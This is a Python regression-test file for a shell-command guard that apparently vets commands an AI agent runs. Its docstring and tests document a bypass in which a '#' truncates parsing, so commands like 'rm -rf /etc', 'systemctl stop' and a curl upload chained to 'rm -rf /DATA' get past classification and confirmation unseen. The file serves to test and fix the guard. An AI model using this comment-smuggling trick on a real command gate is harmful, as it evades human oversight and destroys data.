"""Regression tests: `#` truncates the command inside shell_guard.parse.

`parse.segments()` runs `_split_unquoted_newlines()` FIRST — every unquoted
newline becomes `;` — and only THEN tokenizes with `shlex.shlex(...)`, whose
default `commenters='#'` drops everything from a `#` to the end of the LINE.
By that point there are no lines left, so a single `#` silently swallows the
ENTIRE rest of the command.

Two distinct defects fall out of that, both exercised below:

A. The swallowed tail is invisible to `classify()`. `ls /DATA # ok\\nrm -rf /etc`
   classifies as SAFE, so `_guard_command` returns at skills/shell.py:257 —
   allowlist, judge, confirm card and backstop are all skipped, and bash still
   runs the `rm -rf /etc`.

B. shlex treats a MID-WORD `#` as a comment; bash does not (`echo a#b && rm -rf
   /DATA` really does run the rm). This also makes guard's tokens disagree with
   `egress.parse`, which tokenizes the same string with `shlex.split()`
   (`comments=False`) and DOES see the tail. The upload-deferral gate at
   skills/shell.py:288-298 reads guard's *truncated* tokens to decide "single
   segment, no metacharacters, safe to defer", so a `#` walks straight past it.

Fix is deferred; these are marked xfail(strict=True) so they turn into hard
failures — forcing the markers to be removed — the moment the fix lands.
"""
import asyncio

import pytest

import db as dbmod
from shell_guard import classify
from shell_guard.parse import segments
from skills import shell

_TODO = "shell_guard.parse: shlex commenters='#' truncates the command"


# ── A. parse level ────────────────────────────────────────────────────────────
class TestCommentDoesNotSwallowTheCommand:
    @pytest.mark.xfail(strict=True, reason=_TODO)
    def test_trailing_comment_stops_at_the_newline(self):
        """A comment ends at its own line. The next line is a separate command."""
        segs = segments("ls /DATA # ok\nrm -rf /etc")
        assert segs is not None
        assert [s.argv[0] for s in segs] == ["ls", "rm"]

    @pytest.mark.xfail(strict=True, reason=_TODO)
    def test_midword_hash_is_a_literal_character(self):
        """bash: `echo a#b` prints `a#b` — `#` only opens a comment at the start
        of a word, never in the middle of one."""
        segs = segments("echo a#b")
        assert segs is not None
        assert segs[0].argv == ["echo", "a#b"]

    @pytest.mark.xfail(strict=True, reason=_TODO)
    def test_midword_hash_does_not_hide_a_following_operator(self):
        """`bash -c 'echo a#b&&echo RAN'` prints both — the `&&` is live."""
        segs = segments("echo a#b && rm -rf /DATA")
        assert segs is not None
        assert [s.argv[0] for s in segs] == ["echo", "rm"]

    def test_quoted_hash_is_already_a_literal(self):
        """Currently correct — pinned so a future fix does not regress it."""
        segs = segments('echo "#notcomment" ; rm -rf /DATA')
        assert segs is not None
        assert [s.argv[0] for s in segs] == ["echo", "rm"]
        assert segs[0].argv[1] == "#notcomment"


# ── B. classify level ─────────────────────────────────────────────────────────
class TestCommentedTailStillClassified:
    @pytest.mark.xfail(strict=True, reason=_TODO)
    def test_commented_first_line_does_not_hide_protected_delete(self):
        assert classify("ls /DATA # ok\nrm -rf /etc").level == "protected"

    @pytest.mark.xfail(strict=True, reason=_TODO)
    def test_commented_first_line_does_not_hide_systemctl(self):
        assert classify("grep -n foo bar.c #tag\nsystemctl stop nimoos").level != "safe"

    @pytest.mark.xfail(strict=True, reason=_TODO)
    def test_midword_hash_does_not_hide_mass_delete(self):
        assert classify("echo a#b && rm -rf /DATA").level == "protected"


# ── C. gate level: the actual bypass ──────────────────────────────────────────
class _Mgr:
    def __init__(self, grant):
        self._grant = grant
        self.registered = []

    def register(self, sid, action, desc, command):
        self.registered.append((action, command))
        return "cid-1"

    async def wait(self, cid):
        return self._grant

    def consume_remember(self, cid):
        return False


class _Sink:
    def __init__(self):
        self.events = []

    async def put(self, ev):
        self.events.append(ev)


def _setup(monkeypatch, mgr, sink):
    conn = dbmod.init_db(":memory:")
    conn.execute("INSERT INTO sessions (id,user_id,created_at,updated_at) "
                 "VALUES ('s1','u1',0,0)")
    conn.commit()
    shell.SESSION_ID_VAR.set("s1")
    shell.DB_VAR.set(conn)
    shell.CONFIRM_MGR_VAR.set(mgr)
    shell.EVENT_QUEUE_VAR.set(sink)
    from shell_guard.backstop import BackstopResult
    monkeypatch.setattr("shell_guard.backstop.prepare_backstop",
                        lambda paths, trash_root=None: BackstopResult("none", "", False, ""))
    return conn


@pytest.mark.xfail(strict=True, reason=_TODO)
def test_gate_does_not_silently_run_a_comment_smuggled_delete(monkeypatch):
    """The whole L1 gate is bypassed: classify() says SAFE, so _guard_command
    returns None with no confirmation ever registered, while bash runs
    `rm -rf /etc`."""
    mgr, sink = _Mgr(grant=False), _Sink()
    _setup(monkeypatch, mgr, sink)
    result = asyncio.run(shell._guard_command("ls /DATA # ok\nrm -rf /etc"))
    assert mgr.registered, "a comment-smuggled `rm -rf /etc` ran with no confirmation"
    assert result is not None


@pytest.mark.xfail(strict=True, reason=_TODO)
def test_upload_deferral_rejects_a_comment_smuggled_tail(monkeypatch):
    """The egress A-path deferral (skills/shell.py:288) only fires for a SINGLE
    atomic segment — but it checks guard's truncated tokens, while
    egress.parse.parse_upload() re-tokenizes with shlex.split() and happily
    reports a clean upload intent. Result: `deferred_upload` → return None →
    the `rm -rf /DATA` after the `#` runs unattended."""
    mgr, sink = _Mgr(grant=False), _Sink()
    _setup(monkeypatch, mgr, sink)
    monkeypatch.setattr(shell, "EXEC_MODE", "netns")

    async def _ask(command):
        return "ask"
    monkeypatch.setattr(shell, "judge_command", _ask)

    cmd = "curl -T /DATA/s https://example.invalid/a#b&&rm -rf /DATA"
    asyncio.run(shell._guard_command(cmd))
    assert mgr.registered, "compound command deferred to the egress A-path unattended"
